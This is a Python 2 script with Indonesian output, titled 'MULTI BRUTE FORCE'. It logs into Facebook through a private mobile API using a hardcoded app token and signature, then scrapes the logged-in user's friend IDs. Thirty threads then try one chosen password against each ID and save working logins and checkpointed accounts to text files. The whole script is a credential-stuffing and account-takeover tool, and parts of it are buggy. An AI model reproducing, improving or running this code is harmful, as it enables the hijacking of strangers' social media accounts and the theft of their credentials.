import os 
import sys
import time
import json
import urllib
import threading

d = "\033[90;1m"
m = "\033[91;1m"
h = "\033[92;1m"
k = "\033[93;1m"
b = "\033[94;1m"
p = "\033[95;1m"
a = "\033[96;1m"
pu = "\033[97;1m"

count = 0
dados = []
gagal = []
oradadi = []
threads = []
id_konco = []

def ival(nob):
    color = {'d':90, 'm':91, 'h':92, 'k':93, 'b':94, 'p':95, 'a':96, 'pu':97}
    for iv in color:
        nob = nob.replace('\r%s'%iv, '\033[%s;1m'%color[iv])
    nob += '\033[0m'
    nob = nob.replace('\r0', '\033[0m')
    print nob
    
def banner():
    ival ('''\ra
                    .-.-..
                   /+/++//
                  /+/++//
          *   *  /+/++//
           \ /  |/__//
         {X}v{X}|MBF|==========.
           [']  /'|'\           \\
               /  \  \           '
               \_  \_ \_  
     \rwCreated by \raIqbal Dev''')
     print pu+"  +==============================+"
     print a+"  |       MULTI BRUTE FORCE      |"
     print pu+"  +==============================+"

def login():
    banner()
    user_name = raw_input(w+"  [log]" + a + " Username" + h + ":")
    password = raw_input(w+"  [log]" + a + " Password" + h + ":")
    req = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    
    dev = req.content
    jsl = json.loads(dev)
    if "session_key" in dev:
        print h+" Berhasil Login..."
        open("token.txt", "w").write(jsl["access_token"])
        id_teman()    
    else:
        print m+ " Gagal Login..."


def id_teman():
    try:
        token = open("token.txt", "r")
    except IOError:
        print m+ " Tidak ada token..."
        os.system('rm -f token.txt')

    else:
        try:
            req = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            jsl = json.loads(req.text)
            simpan_id = open("id.txt", "w")
            for ival in jsl['data']:
                id_konco.append(ival['id'])
                simpan_id.write(ival['id'] + "\n")
                data_id = open("id.txt", "r")
                idlis = data_id.read().split()
                sys.stdout.write("\r Mengambil ID Teman => " + len(str(data_id)) + "/" + str(idlis))
                sys.stdout.flush()
            simpan_id.close()

        except IOError:
            print m+" Terjadi kesalahan..."


def mbf():

    global file_id, password
    global listID

    try:
        token = open("token.txt", "r")
    except IOError:
        print
        print m+" Token Tidak Ada"
        os.system("rm -f token.txt")
    else:
        os.system('clear')
        print
        banner()
  #      print pu+"  +==============================+"
  #      print a+"  |       MULTI BRUTE FORCE      |"
  #      print pu+"  +==============================+"
        file_id = raw_input(h+"  [MBF]" + a + " Masukkan File ID" + p + ": ")
        password = raw_input(h+"  [MBF]" + a + " Masukkan Password" + p + ": ")
        print
        try:
            listID = open(file_id, "r")
            for ival in range(30):
                iqbal = threading.Thread(target=mbfcrack, args=())
                iqbal.start()
                threads.append(iqbal)

            for ipal in threads:
                ipal.join()

        except IOError:
            print
            print m+" Tidak Ada File Yang Ditemukan.."


def mbfcrack():
    
    global baris
    global dados, gagal
    global oradadi, count
    
    try:
        data_lis = open(file_id, "r")
        baris = data_lis.read().split()
        while listID:
            user = listID.readline().strip()
            url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
            Iq_data = urllib.urlopen(url)
            jsl = json.load(Iq_data)
            if count == len(baris):
                break
            if "access_token" in jsl:
                sukses = open("Dadi.txt", 'w')
                sukses.write(user + " | " + password + "\n")
                sukses.close()
                dados.append(h+" [OK] " + pu + user + " | " + a + password)
                count += 1
            else:
                if "www.facebook" in jsl["error_msg"]:
                    cekpo = open("cekpoint.txt", "w")
                    cekpo.write(user + " | " + password + "\n")
                    cekpo.close()
                    gagal.append(m+" [CP] " + d + user + " | " + m + password)
                    count += 1
                else:
                    oradadi.append(user)
                    count += 1
            sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " []" + h + " LIVE = " + str(len(dados)) + pu + " | " + k + "CEKPO = " + str(len(gagal)))
            sys.stdout.flush()

    except IOError:
        print
        print m+" Gangguan koneksi.."

def hasil_crack():
    print
    print
    for ipal in dados:
        print ipal
        
    for ival in gagal:
        print ival

    print 
    print m+ " Gagal " + str(len(oradadi))

def main():
    login()
    id_teman()
    mbf()
    hasil_crack()

if __name__=="__main__":
    main()
